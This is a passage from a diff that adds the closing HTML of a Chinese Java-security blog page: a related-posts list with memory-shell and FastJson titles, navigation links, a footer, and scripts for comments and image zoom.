+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="related-link">Weblogic 内存马分析与实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E4%B8%8E%E5%88%A9%E7%94%A8/" class="related-link">FastJson 反序列化绕过与利用</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" rel="prev">&lt; Weblogic 内存马分析与实现</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" rel="next">Tomcat 内存马分析及检测 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
